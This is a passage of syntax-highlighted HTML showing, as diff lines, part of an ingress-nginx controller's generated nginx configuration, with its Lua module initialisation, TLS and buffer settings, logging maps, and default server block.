+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">hsts</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">hsts_max_age</span> = <span style="color:#ae81ff">31536000</span><span style="color:#e6db74">,</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">hsts_include_subdomains</span> = <span style="color:#e6db74">true,</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">hsts_preload</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">global_throttle</span> = {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">memcached</span> = {
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">host</span> = <span style="color:#e6db74">&#34;&#34;,</span> <span style="color:#e6db74">port</span> = <span style="color:#ae81ff">11211</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">connect_timeout</span> = <span style="color:#ae81ff">50</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">max_idle_timeout</span> = <span style="color:#ae81ff">10000</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">pool_size</span> = <span style="color:#ae81ff">50</span><span style="color:#e6db74">,</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#960050;background-color:#1e0010">}</span><span style="color:#e6db74">,</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">status_code</span> = <span style="color:#ae81ff">429</span><span style="color:#e6db74">,</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span><span style="color:#e6db74">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;configuration&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">configuration</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">configuration.prohibited_localhost_port</span> = <span style="color:#e6db74">&#39;10246&#39;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;balancer&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">balancer</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;monitor&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">monitor</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;certificate&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">certificate</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">certificate.is_ocsp_stapling_enabled</span> = <span style="color:#e6db74">false</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;plugins&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">plugins</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">end</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">--</span> <span style="color:#e6db74">load</span> <span style="color:#e6db74">all</span> <span style="color:#e6db74">plugins</span> <span style="color:#e6db74">that&#39;ll</span> <span style="color:#e6db74">be</span> <span style="color:#e6db74">used</span> <span style="color:#e6db74">here</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">plugins.init(</span>{  }<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">init_worker_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">lua_ingress.init_worker()</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">balancer.init_worker()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">monitor.init_worker(10000)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">aio</span>                 <span style="color:#e6db74">threads</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">aio_write</span>           <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">tcp_nopush</span>          <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">tcp_nodelay</span>         <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">log_subrequest</span>      <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">reset_timedout_connection</span> <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">keepalive_timeout</span>  <span style="color:#e6db74">75s</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">keepalive_requests</span> <span style="color:#ae81ff">1000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">client_body_temp_path</span>           <span style="color:#e6db74">/tmp/nginx/client-body</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">fastcgi_temp_path</span>               <span style="color:#e6db74">/tmp/nginx/fastcgi-temp</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_temp_path</span>                 <span style="color:#e6db74">/tmp/nginx/proxy-temp</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">client_header_buffer_size</span>       <span style="color:#ae81ff">1k</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">client_header_timeout</span>           <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">large_client_header_buffers</span>     <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">8k</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">client_body_buffer_size</span>         <span style="color:#ae81ff">8k</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">client_body_timeout</span>             <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">http2_max_concurrent_streams</span>    <span style="color:#ae81ff">128</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">types_hash_max_size</span>             <span style="color:#ae81ff">2048</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">server_names_hash_max_size</span>      <span style="color:#ae81ff">1024</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">server_names_hash_bucket_size</span>   <span style="color:#ae81ff">64</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">map_hash_bucket_size</span>            <span style="color:#ae81ff">64</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_headers_hash_max_size</span>     <span style="color:#ae81ff">512</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_headers_hash_bucket_size</span>  <span style="color:#ae81ff">64</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">variables_hash_bucket_size</span>      <span style="color:#ae81ff">256</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">variables_hash_max_size</span>         <span style="color:#ae81ff">2048</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">underscores_in_headers</span>          <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ignore_invalid_headers</span>          <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">limit_req_status</span>                <span style="color:#ae81ff">503</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">limit_conn_status</span>               <span style="color:#ae81ff">503</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">include</span> <span style="color:#e6db74">/etc/nginx/mime.types</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">default_type</span> <span style="color:#e6db74">text/html</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Custom headers for response
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">server_tokens</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">more_clear_headers</span> <span style="color:#e6db74">Server</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># disable warnings
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">uninitialized_variable_warn</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Additional available variables:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># $namespace
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># $ingress_name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># $service_name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># $service_port
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">log_format</span> <span style="color:#e6db74">upstreaminfo</span> <span style="color:#e6db74">&#39;</span>$remote_addr <span style="color:#e6db74">-</span> $remote_user <span style="color:#e6db74">[</span>$time_local] <span style="color:#e6db74">&#34;</span>$request&#34; $status $body_bytes_sent <span style="color:#e6db74">&#34;</span>$http_referer&#34; <span style="color:#e6db74">&#34;</span>$http_user_agent&#34; $request_length $request_time <span style="color:#e6db74">[</span>$proxy_upstream_name] <span style="color:#e6db74">[</span>$proxy_alternative_upstream_name] $upstream_addr $upstream_response_length $upstream_response_time $upstream_status $req_id&#39;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">map</span> $request_uri $loggable {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">default</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">access_log</span> <span style="color:#e6db74">/var/log/nginx/access.log</span> <span style="color:#e6db74">upstreaminfo</span>  <span style="color:#e6db74">if=</span>$loggable;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">error_log</span>  <span style="color:#e6db74">/var/log/nginx/error.log</span> <span style="color:#e6db74">notice</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">resolver</span> <span style="color:#ae81ff">10</span><span style="color:#e6db74">.96.0.10</span> <span style="color:#e6db74">valid=30s</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># See https://www.nginx.com/blog/websocket-nginx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">map</span> $http_upgrade $connection_upgrade {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">default</span>          <span style="color:#e6db74">upgrade</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># See http://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">&#39;&#39;</span>               <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Reverse proxies can detect if a client provides a X-Request-ID header, and pass it on to the backend server.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># If no such header is provided, it can provide a random value.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">map</span> $http_x_request_id $req_id {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">default</span>   $http_x_request_id;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;&#34;</span>        $request_id;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Create a variable that contains the literal $ character.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># This works because the geo module will not resolve variables.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">geo</span> $literal_dollar {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">default</span> <span style="color:#e6db74">&#34;</span>$&#34;;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">server_name_in_redirect</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">port_in_redirect</span>        <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ssl_protocols</span> <span style="color:#e6db74">TLSv1.2</span> <span style="color:#e6db74">TLSv1.3</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ssl_early_data</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># turn on session caching to drastically improve performance
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ssl_session_cache</span> <span style="color:#e6db74">shared:SSL:10m</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ssl_session_timeout</span> <span style="color:#ae81ff">10m</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># allow configuring ssl session tickets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">ssl_session_tickets</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># slightly reduce the time-to-first-byte
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">ssl_buffer_size</span> <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># allow configuring custom ssl ciphers
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">ssl_ciphers</span> <span style="color:#e6db74">&#39;ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ssl_prefer_server_ciphers</span> <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ssl_ecdh_curve</span> <span style="color:#e6db74">auto</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># PEM sha: d4a5bb02bbdc5e6bae72705a6fbf993cd3e3e8ad
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">ssl_certificate</span>     <span style="color:#e6db74">/etc/ingress-controller/ssl/default-fake-certificate.pem</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ssl_certificate_key</span> <span style="color:#e6db74">/etc/ingress-controller/ssl/default-fake-certificate.pem</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_ssl_session_reuse</span> <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">upstream</span> <span style="color:#e6db74">upstream_balancer</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">### Attention!!!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e"># We no longer create &#34;upstream&#34; section for every backend.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e"># Backends are handled dynamically using Lua. If you would like to debug
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e"># and see what backends ingress-nginx has in its memory you can
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e"># install our kubectl plugin https://kubernetes.github.io/ingress-nginx/kubectl-plugin.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e"># Once you have the plugin you can use &#34;kubectl ingress-nginx backends&#34; command to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e"># inspect current backends.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">###
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">server</span> <span style="color:#ae81ff">0</span><span style="color:#e6db74">.0.0.1</span>; <span style="color:#75715e"># placeholder
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">balancer_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">balancer.balance()</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">keepalive</span> <span style="color:#ae81ff">320</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">keepalive_time</span> <span style="color:#e6db74">1h</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">keepalive_timeout</span>  <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">keepalive_requests</span> <span style="color:#ae81ff">10000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Cache for internal auth checks
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">proxy_cache_path</span> <span style="color:#e6db74">/tmp/nginx/nginx-cache-auth</span> <span style="color:#e6db74">levels=1:2</span> <span style="color:#e6db74">keys_zone=auth_cache:10m</span> <span style="color:#e6db74">max_size=128m</span> <span style="color:#e6db74">inactive=30m</span> <span style="color:#e6db74">use_temp_path=off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Global filters
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">## start server _
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">server</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">server_name</span> <span style="color:#e6db74">_</span> ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">http2</span> <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#ae81ff">80</span> <span style="color:#e6db74">default_server</span> <span style="color:#e6db74">reuseport</span> <span style="color:#e6db74">backlog=4096</span> ;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:80</span> <span style="color:#e6db74">default_server</span> <span style="color:#e6db74">reuseport</span> <span style="color:#e6db74">backlog=4096</span> ;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#ae81ff">443</span> <span style="color:#e6db74">default_server</span> <span style="color:#e6db74">reuseport</span> <span style="color:#e6db74">backlog=4096</span> <span style="color:#e6db74">ssl</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:443</span> <span style="color:#e6db74">default_server</span> <span style="color:#e6db74">reuseport</span> <span style="color:#e6db74">backlog=4096</span> <span style="color:#e6db74">ssl</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;-&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">ssl_reject_handshake</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">ssl_certificate_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">certificate.call()</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">location</span> <span style="color:#e6db74">/</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $namespace      <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $ingress_name   <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $service_name   <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $service_port   <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $location_path  <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $global_rate_limit_exceeding <span style="color:#e6db74">n</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">rewrite_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">lua_ingress.rewrite({</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">force_ssl_redirect</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">ssl_redirect</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">force_no_ssl_redirect</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">preserve_trailing_slash</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">use_port_in_redirects</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">global_throttle</span> = { <span style="color:#f92672">namespace</span> = <span style="color:#e6db74">&#34;&#34;,</span> <span style="color:#e6db74">limit</span> = <span style="color:#ae81ff">0</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">window_size</span> = <span style="color:#ae81ff">0</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">key</span> = { }<span style="color:#f92672">,</span> <span style="color:#e6db74">ignored_cidrs</span> = { } }<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#960050;background-color:#1e0010">}</span><span style="color:#e6db74">)</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">balancer.rewrite()</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># be careful with `access_by_lua_block` and `satisfy any` directives as satisfy any
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># will always succeed when there&#39;s `access_by_lua_block` that does not have any lua code doing `ngx.exit(ngx.DECLINED)`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># other authentication method such as basic auth or external auth useless - all requests will be allowed.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e">#access_by_lua_block {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e">#}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">header_filter_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">lua_ingress.header()</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">body_filter_by_lua_block</span> {
